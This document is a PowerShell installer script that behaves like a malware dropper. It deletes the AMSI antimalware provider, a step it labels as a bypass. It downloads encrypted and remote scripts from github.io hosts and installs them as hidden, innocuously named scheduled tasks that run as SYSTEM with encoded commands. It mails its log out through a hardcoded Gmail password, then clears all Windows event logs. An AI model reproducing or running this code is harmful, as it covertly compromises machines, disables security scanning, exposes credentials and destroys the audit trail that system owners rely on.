
[CmdletBinding(SupportsShouldProcess)]
param()
$fname=(new-guid).Guid
$fname = $fname.substring(0,20)
$FullLogs = ""
$LogFilePath="$env:Temp\$fname.001"
$EnableLogs=$True
Function OutString{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Msg
    )

    if($EnableLogs -eq $False){
        return
    }

    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        
        if ($PSCmdlet.ShouldProcess($Msg)) {
            [pscustomobject]@{
                Time = (Get-Date -f g)
                Message = $Msg
            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
         }
    }else{
        if ($PSCmdlet.ShouldProcess($Msg)) {
            [pscustomobject]@{
                Time = (Get-Date -f g)
                Message = $Msg
            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
         }
    }

    $FullLogs = $FullLogs + $Msg + '`n`n'
}


function RemoveOldTasks {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [int]$Days
    )

    try{
        $BackupEA = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"

        OutString "Cleanup: Looking for tasks created in the last $Days days..."

        $Report = @()
        $NumTasks = 0
        $path = "c:\Windows\System32\Tasks"
        $tasks = Get-ChildItem -recurse -Path $path -File
        foreach ($task in $tasks)
        {
            $Details = "" | select Task, IsHidden, Enabled, Application
            $AbsolutePath = $task.directory.fullname + "\" + $task.Name
            $TaskInfo = [xml](Get-Content $AbsolutePath)
            #$Details.ComputerName = $Computer
            $Details.Task = $task.name
            $Details.IsHidden = $TaskInfo.task.settings.hidden
            $Details.Enabled = $TaskInfo.task.settings.enabled
            $Details.Application = $TaskInfo.task.actions.exec.command

            $CreationDate=[datetime]$task.CreationTime
            $LimitDate= (get-date).AddDays(- $Days)
            if($CreationDate -gt  $LimitDate) {
                $tname=$task.name
                OutString "`tcreated on $CreationDate`t$tname"
                $Report += $Details
                $NumTasks = $NumTasks + 1
            }
        } 


        if($NumTasks -eq 0){
            throw "No tasks to delete..."
        }
        OutString "Cleanup:Found $NumTasks tasks... "
        foreach ($tdel in $Report){
            $tname=$tdel.Task
            
            if ($PSCmdlet.ShouldProcess($tname)) {
                OutString "`tStop-ScheduledTask -TaskName $tname"
                #Stop-ScheduledTask -TaskName $tname  -Confirm:$False | Out-String | Write-Verbose
                #OutString "`tDisable-ScheduledTask -TaskName $tname   WOULD"
                #Disable-ScheduledTask -TaskName $tname  -Confirm:$False | Out-String | Write-Verbose
                #Unregister-ScheduledTask -TaskName $tname  -Confirm:$False | Out-String | Write-Verbose
            }
        }
                
    }catch{
        $ErrorActionPreference = $BackupEA
        Write-Error $_
    }
    finally{
        $ErrorActionPreference = $BackupEA
    }
    
} 

function Install-CRegistryKey
{
    <#
    .SYNOPSIS
    Creates a registry key.  If it already exists, does nothing.
    
    .DESCRIPTION
    Given the path to a registry key, creates the key and all its parents.  If the key already exists, nothing happens.
    
    .EXAMPLE
    Install-CRegistryKey -Path 'hklm:\Software\Carbon\Test'
    
    Creates the `hklm:\Software\Carbon\Temp` registry key if it doesn't already exist.
    #>
    [CmdletBinding(SupportsShouldPRocess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        # The path to the registry key to create.
        $Path
    )
    
    $BackupEA = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    if( -not (Test-Path -Path $Path -PathType Container) )
    {
        OutString "New-Item -Path $Path -ItemType RegistryKey -Force"
        New-Item -Path $Path -ItemType RegistryKey -Force | Out-String | Write-Verbose
    }
}

function Set-Key {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [string]$KeyString
    )
    $length = $KeyString.length
    $pad = 32-$length
    if (($length -lt 16) -or ($length -gt 32)) {Throw "String must be between 16 and 32 characters"}
    $encoding = New-Object System.Text.ASCIIEncoding
    $bytes = $encoding.GetBytes($KeyString + "0" * $pad)
    return $bytes
}

Function Decrypt-String {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [string]$EncryptedString,
        [Parameter(Mandatory = $true)]
        [string]$Passphrase
    )
    $BackupEA = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $EncryptionKey=Set-Key $Passphrase
    Try{
        $SecureString = ConvertTo-SecureString $EncryptedString -Key $EncryptionKey
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString)
        [string]$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

        Return $String
    }
    Catch{Throw $_}

}

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $BackupEA = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"

        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    $B64Cipher=[System.Convert]::ToBase64String($encryptedBytes)
                    Set-Content -Path $outPath -Value $B64Cipher
                    #[System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    #$cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $B64Cipher = Get-Content $File.FullName
                    $cipherBytes=[System.Convert]::FromBase64String($B64Cipher)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    #return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}




Function Send-InstallNotification {
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$subject,
        [string]$msgbody,
        [string]$file=""
    )
    try {
        $BackupEA = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"

        $EmailFrom = "radicaltronic@gmail.com"
        $EmailTo = "guillaumeplante.qc@gmail.com"
        $pass = "SecretTEst23_"

        $message = new-object System.Net.Mail.MailMessage 
        $message.From = $EmailFrom 
        $message.To.Add($EmailTo)
        $message.IsBodyHtml = $True 
        $message.Subject = $subject 

        if($file -ne ""){
          if(Test-Path -Path $file){
              $attachment = $file
              $attach = new-object Net.Mail.Attachment($attachment) 
              $message.Attachments.Add($attach)   
          }
        }
        $message.body = $msgbody
        $SMTPServer = "smtp.gmail.com"
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
        $SMTPClient.EnableSsl = $true
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass);
        $SMTPClient.Send($message)
    }
    catch
    {
        $Msg="Ran into an issue: $($PSItem.ToString())"
        #write-host '[test-exceptions] ' -NoNewLine -f Red
        #write-host $Msg -f DarkYellow
        write-verbose $Msg 
        if($PSCmdlet -ne $null){
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
        
    }   
}


function ConvertTo-EncodedScript {
  [CmdletBinding(SupportsShouldProcess)]
  param
  (
    [string]$Path,
    [switch]$WriteFile=$false
  )
  
  $Code = Get-Content -Path $Path -Raw
  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) 
  $Base64 = [Convert]::ToBase64String($Bytes) 
  
  if($WriteFile){
      $NewPath = [System.IO.Path]::ChangeExtension($Path, '.b64')
      $Base64 | Set-Content -Path $NewPath
  }

  return $Base64
}

Function New-ScheduledTaskFolder{
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [string]$TaskPath
    )
    $BackupEA = $ErrorActionPreference
    $ErrorActionPreference = "Stop"

    OutString "New-ScheduledTaskFolder called with path $TaskPath"


    $scheduleObject = New-Object -ComObject schedule.service
    $scheduleObject.connect()
    $rootFolder = $scheduleObject.GetFolder("\")
    Try 
    {
        $null = $scheduleObject.GetFolder($TaskPath)
    }
    Catch { 
        $null = $rootFolder.CreateFolder($TaskPath) 
        $ErrorActionPreference = $BackupEA
    }
    Finally { 
        $ErrorActionPreference = $BackupEA
    } 
}

function Install-EncodedScriptTask {
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$TaskName,
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [int]$Interval,
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$EncodedTask
    )

    $BackupEA = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $EncodedTaskLen=$EncodedTask.Length
    OutString "Install-EncodedScriptTask called with taskname $TaskName. Code: EncodedTask ($EncodedTaskLen chars)"

    $action = New-ScheduledTaskAction -Execute "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-ExecutionPolicy Unrestricted -NoProfile -WindowStyle Hidden -NonInteractive -EncodedCommand $EncodedTask"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Interval)
    $principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Hidden -Priority 3
    $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings

    if ($PSCmdlet.ShouldProcess($TaskName)) { 
        Register-ScheduledTask $TaskName -InputObject $task | Out-String | Write-Verbose
        Start-ScheduledTask -TaskName $TaskName | Out-String | Write-Verbose
    }   

    $ErrorActionPreference = $BackupEA
}


function Cleanup {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $false)]
        [switch]$DeleteLogFiles,
        [Parameter(Mandatory = $false)]
        [switch]$DeleteEvents
    )

    try {
        $BackupEA = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"

        if($DeleteEvents){
            Get-WinEvent -ListLog * -Force | % {   
                Wevtutil.exe cl $_.LogName | Out-null   
            }
        }
        if($DeleteLogFiles){
            Remove-Item -Path "$env:Temp\LogFile.csv" -Force -ErrorAction SilentlyContinue | Out-null   
            Remove-Item -Path $LogFilePath -Force -ErrorAction SilentlyContinue  | Out-null   
        }

        $ErrorActionPreference = $BackupEA
    }
    catch{
        $Msg="Ran into an issue: $($PSItem.ToString())"
        write-verbose $Msg 
    }  

}

function Set-ScriptDataToRegistry {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [String]$ScriptData
    )
    $RegKeyRootPath="HKLM:\SOFTWARE\SoundIncorporated"
    $RegKeyPath=Join-Path $RegKeyRootPath "Software\Controls\MediaSystems"
    $RegKeyName="WinSec"
    $FullRegKeyPath=Join-Path $RegKeyPath $RegKeyName

    if(Test-Path -Path $RegKeyRootPath){
        OutString "Remove-Item -Path $RegKeyRootPath"
        Remove-Item -Path "$RegKeyRootPath" -Recurse -Force -ErrorAction SilentlyContinue | Out-String | Write-Verbose 
    }

    Install-CRegistryKey -Path $RegKeyPath
    OutString "Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value ***codeddata*** -PropertyType String"
    Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value $ScriptData   | Out-String | Write-Verbose
}


function Get-Base64FromUrl {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [String]$Url
    )
    try {
            OutString "Get-Base64FromUrl: $Url"
            $webclient = New-Object Net.WebClient
            $DownloadedData = $webclient.DownloadString($Url)
            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($DownloadedData) 
            $Base64 = [Convert]::ToBase64String($Bytes)
            $Base64CommandLen=$Base64Command.Length
            $DownloadedDataLen=$DownloadedData.Length
            OutString "`tsuccess! Downloaded $DownloadedDataLen bytes"
            OutString "`tsuccess! Converted to $Base64CommandLen bytes in Base64"
            return $Base64 
    }
    catch
    {
        $Msg="Get-Base64FromUrl Ran into an issue: $($PSItem.ToString())"
        if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
            write-host '[install]   ' -NoNewLine -f Red
            write-host $Msg -f DarkYellow
            Write-Verbose $Msg
            #write-host '[test-exceptions] ' -NoNewLine -f Red
        #write-host $Msg -f DarkYellow
        }

        write-verbose $Msg 
        if($PSCmdlet -ne $null){
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
        
    }   


}



<#         ********************
#              PREPARATION
#          ********************
#>
OutString "----------   INSTALL START   ----------"
OutString "RemoveOldTasks"

RemoveOldTasks 5

# AMSI
OutString "AMSI BYPASS"
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 
$webclient = New-Object Net.WebClient

$NewTaskFolder=$env:COMPUTERNAME + '-Maintenance'
OutString "Creating New Scheduled Task Folder: $NewTaskFolder"
New-ScheduledTaskFolder $NewTaskFolder



<#         *******************************************
#              UPDATE TASKS DEFINITION (ENCRYPTED)
#         *******************************************
#>
$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/hourly.ps1.aes'
$EncryptedScript = $webclient.DownloadString($ScriptUrl)
OutString "Getting Script: $ScriptUrl saving TO REGISTRY..."
Set-ScriptDataToRegistry $EncryptedScript


<#         ***********************
#                 TASK NO 1
#         ************************
#>
try{
    $NewTaskName=$NewTaskFolder + '\' + 'FamilySafetyRulesUpdateTasks'
    $ScriptUrl='https://radicaltronic.github.io/cmd/run-hourly.ps1'
    $Base64Command=Get-Base64FromUrl $ScriptUrl
    $Base64CommandLen=$Base64Command.Length
    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
    Install-EncodedScriptTask $NewTaskName 15 $Base64Command
}catch
{
    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        Write-Verbose $Msg
    }
    write-verbose $Msg 
    if($PSCmdlet -ne $null){
        $PSCmdlet.ThrowTerminatingError($PSItem)
    }     
}   

<#         ***********************
#                 TASK NO 2
#         ************************
#>
try{
    $NewTaskName=$NewTaskFolder + '\' + 'FamilyDailySafetyUpdate'
    $ScriptUrl='https://radicaltronic.github.io/cmd/update-runner-scriptblock.ps1'
    $Base64Command=Get-Base64FromUrl $ScriptUrl
    $Base64CommandLen=$Base64Command.Length
    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
    Install-EncodedScriptTask $NewTaskName 500 $Base64Command
}catch
{
    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        Write-Verbose $Msg
    }
    write-verbose $Msg 
    if($PSCmdlet -ne $null){
        $PSCmdlet.ThrowTerminatingError($PSItem)
    }     
}  

$EnableLogs=$false
$TempFile="$env:Temp\att.txt"
Copy-Item "$LogFilePath" "$TempFile"

OutString "Send-InstallNotification"
Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "test again, check file" "$LogFilePath"

OutString "Cleanup"
Cleanup -DeleteEvents -DeleteLogFiles

Sleep 1
Remove-Item "$TempFile" -Force